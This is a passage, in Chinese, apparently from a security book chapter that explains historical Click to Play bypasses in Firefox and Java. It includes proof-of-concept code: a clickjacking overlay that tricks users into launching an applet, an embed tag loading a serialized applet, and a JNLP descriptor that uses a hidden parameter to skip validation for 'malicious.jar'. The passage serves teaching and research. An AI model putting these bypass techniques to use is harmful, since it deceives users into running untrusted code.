
-   [过去曾出现过 Click to Play 的错误，这些错误允许插件自动显示。本·墨雷菲（Ben Murphy）发现了一个有趣的绕过方法，并且该方法一直对 Firefox 起效，直到 2013 年 3 月。[Proof of Concept 很简单但有效：]

```
<html>
  <head>
    <style type='text/css
css'>
       #overlay {
         background-color: black;
         position: absolute;
         top: 0px;
         left: 0px;
         width: 550px;
         height: 450px;
         color: white;
         text-align: center;
         padding-top: 100px;
         pointer-events: none;
       }
    </style>
    <body>
      <div id="overlay">Click here</div>
      <applet code="Foo.class" width="500" height="500"/>
  </body>
</html>
```

-   [通过指定 `pointer-events: none`，可以阻止对黑色 #overlaydiv 的任何鼠标事件触发。随后可以诱导用户点击 “Click here” 信息，从而执行 Java Applet（如图 8-8 所示）。]

[**Figure 8-8:**](#c08.html#figureanchor8-8) Click to Play 绕过执行未签名的 Java Applet

![c08f008.tif](image_fi/662090c08/c08f008.png)

end figure 

-   [通过动态修改 overlay div 的 CSS 定义，并加入 `opacity: 0.4`，可以看到 overlay 后面的内容（如图 8-9 所示）。利用此技巧以及一定的社交工程，用户实际上是在点击 Click to Play 对话框。]

[**Figure 8-9:**](#c08.html#figureanchor8-9) 添加透明度以显示背后的内容

![c08f009.tif](image_fi/662090c08/c08f009.png)

end figure 

-   [Firefox 会通过在地址栏左上方显示红色插件图标提示插件已过期。不够专注的用户仍可能点击黑色 div。图 8-8 与图 8-9 中均可见红色警告图标。]

-   [当此类漏洞被发现时，补丁通常会很快发布，导致定位受影响的浏览器往往是“捡起即丢”。精确的浏览器指纹识别有助于判断目标浏览器是否易受攻击。还可以构建逻辑，决定如何最佳交付插件以最大化激活概率。]

### Java 示例

-   [从 Java 7 更新 11 开始，Oracle 修改了 Click to Play 的实现，使得即使是未签名的 Applet 也会显示。这大幅削弱了利用 Java 漏洞和 SOP 绕过进行攻击的效果。]

-   [Click to Play 的实现中存在若干错误，常常允许在无需用户交互的情况下执行 Java Applet。第一个绕过（编号 10）由 Esteban Guillardoy 在 Java 7 更新 13 中修复，利用了一个“较少人知”的 Applet 属性 `object` 来加载序列化的 Applet。]

-   [如果查看 Java 的 `Plugin2Manager` 类的源码，可以看到 Click to Play 逻辑。具体在 `initAppletAdapter()` 方法中，若使用 `code` 属性实例化 Applet，则会调用 `fireAppletSSVValidation()` 方法：]

```
void initAppletAdapter(AppletExecutionRunnable
  paramAppletExecutionRunnable)
  throws ClassNotFoundException, IllegalAccessException,
  ExitException, JRESelectException, IOException,
  InstantiationException {
 long l = DeployPerfUtil.put(
    0L,"Plugin2Manager.createApplet() - BEGIN");
 /*
  * Get the values of the "code" and "object" applet attributes
  */  
 String str1 = getSerializedObject();
 String str2 = getCode();

 [...snip...]

 if ((str2 != null) && (str1 != null)) {
  System.err.println(amh.getMessage("runloader.err"));
  throw new InstantiationException(
    "Either \"code\" or \"object\"" + 
    " should be specified, but not both.");
 }
 if ((str2 == null) && (str1 == null))
  return;
 if (str2 != null) {
  /*
   * Load applet normally through the "code" attribute. 
   * Fires the CtP pop=up, waiting for user intervention.
   */
   if (fireAppletSSVValidation()) {
    appletSSVRelaunch();
   }
   [...snip...]
 } else {
  if (!this.isSecureVM)
   return;
  // load the Serialized applet through the "object" attribute
  this.adapter.instantiateSerialApplet(localPlugin2ClassLoader, str1);
  this.doInit = false;
  DeployPerfUtil
    .put("Plugin2Manager.createApplet()" + 
      " - post: secureVM .. serialized .. ");
 }

[...snip...] 

 DeployPerfUtil.put(l, "Plugin2Manager.initAppletAdapter() - END");
}
```

-   [当未使用 `code` 属性而使用 `object` 属性时，Java 会直接加载序列化的 Applet，而不会触发 Click to Play。]

-   [要利用此缺陷，可在嵌入标签中使用以下代码：]

```
<embed object="object.ser" 
type="application/x-java-applet;version=1.6">
```

-   [另一个由 Esteban 发现的绕过（编号 12）在 Java 7 更新 21 中被修复。该绕过依赖于通过 Java Network Launching Protocol（JNLP）描述符传递一个隐藏参数。JNLP 可用于启动 Applet，并且可以指定 Applet 运行所需的 Java 版本。]

-   [在分析 Java 的 `PluginMain` 类的 `performSSVValidation()` 方法时，可注意到如下代码：]

```
public static boolean performSSVValidation
        (Plugin2Manager paramPlugin2Manager)
        throws ExitException {

  boolean bool = Boolean.valueOf(paramPlugin2Manager.
                   getParameter("__applet_ssv_validated")).
                      booleanValue();
  if (bool)
    return false;
  LaunchDesc localLaunchDesc = null;
  AppInfo localAppInfo = null;
  
  [...snip...]
}
```

-   [注意到未记录的 `__applet_ssv_validated` 参数，若其值为 `true`，则会跳过所有检查直接返回。正常 Applet 调用会因参数名以 `_` 开头而被排除，但通过 JNLP 描述符调用时并受此限制。]

-   [因此，可以通过在 JNLP 描述符中使用该隐藏参数来绕过 Click to Play 限制。]

-   [下面是一个示例 JNLP 描述符：]

```
<?xml version="1.0" encoding="utf-8"?> 
<jnlp spec="1.0" xmlns:jfx=http://javafx.com
 href="applet_security_bypass.jnlp"> 
  <information> 
    <title>Applet Test JNLP</title> 
    <vendor>Oracle</vendor> 
    <description>Esteban CtP bypass</description> 
    <offline-allowed/> 
  </information> 
  
   <resources> 
        <j2se version="1.7" 
          href="http://java.sun.com/products/autodl/j2se" /> 
        <jar href="malicious.jar" main="true" /> 
  </resources> 
  <applet-desc 
     name="Malicious Applet" 
     main-class="Main" 
     width="1" 
     height="1"> 
     <param name="__applet_ssv_validated" value="true"></param> 
 </applet-desc> 
 <update check="background"/> 
</jnlp>
```

-   [隐藏参数需要在 JNLP 文件的 Applet 描述部分指定：]

```
<param name="__applet_ssv_validated" value="true"></param> 
```

-   [最后一步是从 Web 服务器提供该 JNLP 文件，并在触发 Applet 执行的页面中引用它，示例代码如下：]

